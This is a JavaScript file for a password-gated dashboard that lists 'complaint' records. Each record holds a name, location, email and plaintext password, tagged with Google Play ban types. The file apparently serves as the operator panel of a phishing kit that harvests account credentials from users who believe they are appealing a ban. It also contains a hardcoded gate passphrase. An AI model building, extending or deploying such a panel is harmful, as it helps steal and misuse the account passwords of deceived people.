const KEY      = 'gplay_complaints';
const PASS     = 'B88DeZ%4z+E6@fcnethunter';
const SES      = 'dn_authed';

let all = [], view = [];

/* ─── AUTH ─── */
window.addEventListener('DOMContentLoaded', () => {
  if (sessionStorage.getItem(SES) === '1') showDash(false);
  document.getElementById('gate-field').addEventListener('keydown', e => {
    if (e.key === 'Enter') tryLogin();
  });
});

function tryLogin() {
  const v = document.getElementById('gate-field').value;
  if (v === PASS) {
    sessionStorage.setItem(SES, '1');
    showDash(true);
  } else {
    const err = document.getElementById('gate-err');
    err.textContent = 'ACCESS DENIED';
    document.getElementById('gate-field').value = '';
    setTimeout(() => err.textContent = '', 2000);
  }
}

function showDash(animate) {
  const gate = document.getElementById('gate');
  const dash = document.getElementById('dash');
  if (animate) {
    gate.classList.add('fade-out');
    setTimeout(() => { gate.style.display = 'none'; dash.classList.add('on'); load(); }, 500);
  } else {
    gate.style.display = 'none';
    dash.classList.add('on');
    load();
  }
}

function lockOut() {
  sessionStorage.removeItem(SES);
  const gate = document.getElementById('gate');
  const dash = document.getElementById('dash');
  dash.classList.remove('on');
  gate.style.display = 'flex';
  gate.classList.remove('fade-out');
  document.getElementById('gate-field').value = '';
  document.getElementById('gate-err').textContent = '';
}

/* ─── DATA ─── */
function load() {
  all  = JSON.parse(localStorage.getItem(KEY) || '[]');
  view = [...all];
  render();
  stats();
}

function stats() {
  document.getElementById('st-total').textContent   = all.length;
  document.getElementById('st-account').textContent = all.filter(c => c.problem === 'ban-account').length;
  document.getElementById('st-redeem').textContent  = all.filter(c => c.problem === 'ban-redeem').length;
  document.getElementById('st-points').textContent  = all.filter(c => c.problem === 'ban-points').length;
  document.getElementById('rec-count').textContent  = all.length + ' REC';
}

function render() {
  const tbody = document.getElementById('tbody');
  const empty = document.getElementById('empty');

  if (!view.length) {
    tbody.innerHTML = '';
    empty.style.display = 'block';
    return;
  }
  empty.style.display = 'none';

  tbody.innerHTML = view.slice().reverse().map(c => {
    const d    = new Date(c.date);
    const date = d.toLocaleDateString('ar-SA') + '  ' +
                 d.toLocaleTimeString('ar-SA', { hour:'2-digit', minute:'2-digit' });

    return `<tr>
      <td title="${esc(c.name)}">${esc(c.name)}</td>
      <td>${esc(c.location)}</td>
      <td class="td-mono" title="${esc(c.email)}">${esc(c.email)}</td>
      <td class="td-mono">${esc(c.password || '—')}</td>
      <td><span class="tag ${c.problem}">${esc(c.problemLabel)}</span></td>
      <td class="td-mono">${date}</td>
      <td>
        <button class="btn-del" onclick="del(${c.id})" title="DELETE">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <polyline points="3 6 5 6 21 6"/>
            <path d="M19 6l-1 14H6L5 6M10 11v6M14 11v6M9 6V4h6v2"/>
          </svg>
        </button>
      </td>
    </tr>`;
  }).join('');
}

function esc(s) {
  return String(s)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;')
    .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

function del(id) {
  all  = all.filter(c  => c.id !== id);
  view = view.filter(c => c.id !== id);
  localStorage.setItem(KEY, JSON.stringify(all));
  render(); stats();
  toast('RECORD DELETED');
}

function wipeAll() {
  if (!all.length) return;
  if (!confirm('WIPE ALL RECORDS — ARE YOU SURE?')) return;
  localStorage.removeItem(KEY);
  all = []; view = [];
  render(); stats();
  toast('ALL RECORDS WIPED');
}

function search(val) {
  const q = val.trim().toLowerCase();
  view = q
    ? all.filter(c =>
        c.name.toLowerCase().includes(q)     ||
        c.email.toLowerCase().includes(q)    ||
        c.location.toLowerCase().includes(q) ||
        c.problemLabel.includes(q))
    : [...all];
  render();
}

function toast(msg) {
  const el = document.getElementById('toast');
  el.textContent = msg;
  el.classList.add('show');
  setTimeout(() => el.classList.remove('show'), 2500);
}

setInterval(() => { if (sessionStorage.getItem(SES)) load(); }, 8000);
